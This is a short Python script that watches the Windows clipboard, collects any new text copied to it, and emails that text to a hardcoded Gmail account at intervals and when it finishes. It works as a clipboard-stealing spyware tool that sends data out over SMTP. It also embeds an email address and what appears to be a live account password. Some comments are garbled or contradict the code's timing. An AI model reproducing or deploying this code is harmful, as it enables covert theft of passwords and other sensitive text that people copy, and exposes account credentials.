# =============================================================================
# This program will listen to the users clipboard and copy the data to a list
# this list is then sent every 10 minutes to a user defined gmail address
# Note you must use a GMAIL address to send from
# You MUST 'enable control to less secure apps' 
# https://support.google.com/a/answer/6260879?hl=en
# Please run the following command in command prompt/anaconda prompt etc 
# Before you run this script:
# python -m smtpd -c DebuggingServer -n localhost:1025
# =============================================================================

import win32clipboard
import smtplib, ssl
import time


#Accound details for user email
email = "pyteser@gmail.com"
password = "N15IEYwqEwI7"
port = 465

#ttl = time to live, how long the program will run for in seconds(24hrs)
ttl = 5 #time to live, to be changed

# =============================================================================
#function to send clipboard data to a defined email address via smtp
def sendClipboard(email,password,message,port):
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(email, password)
        server.sendmail(email, email, message)
# =============================================================================
        

# =============================================================================
#the clipboard data sent via email must be in ascii, this avoids crashes when 
#the user copies an image, or other non text file
def is_ascii(s):
    return all(ord(c) < 128 for c in s)
# =============================================================================

# =============================================================================
#this function copies data from the clipboard to a print("P2:",c,onBoard) c
def clipboardCopy(c):
    try:
        win32clipboard.OpenClipboard()
        onBoard = win32clipboard.GetClipboardData()
        #print if var is different
        if c != onBoard and is_ascii(onBoard) == True:
            c = onBoard
    except:
        pass
    win32clipboard.CloseClipboard()
    time.sleep(1.5)
    return c
# =============================================================================

# =============================================================================
def main():
    #current is the current running string of copied data
    #message is the current string of all copied data to be sent in the email
    message = ""
    currentData = ""
    lastData = ""
    
    #run while current time is less than the ttl
    start = time.time()
    while time.time() - start < ttl:
        currentData = clipboardCopy(currentData)
        if currentData != lastData: #add currentData to message if it has changed
            message =  message + "\n*****\n" + currentData 
            
        time_dif = round((time.time() - start))  
        every = 30 #send email after 'every' seconds
        #if current time is equal to deicced time in seconds send email
        if  time_dif % every == 0: 
            sendClipboard(email,password,message,port)
            message = ""
            
        lastData = currentData
        #print(lastData) #see last piece scrapped
        
    #Send at the very end of life just in case
    sendClipboard(email,password,message,port)
# =============================================================================


if __name__ == "__main__":
    #inform user and go to main method
    main()
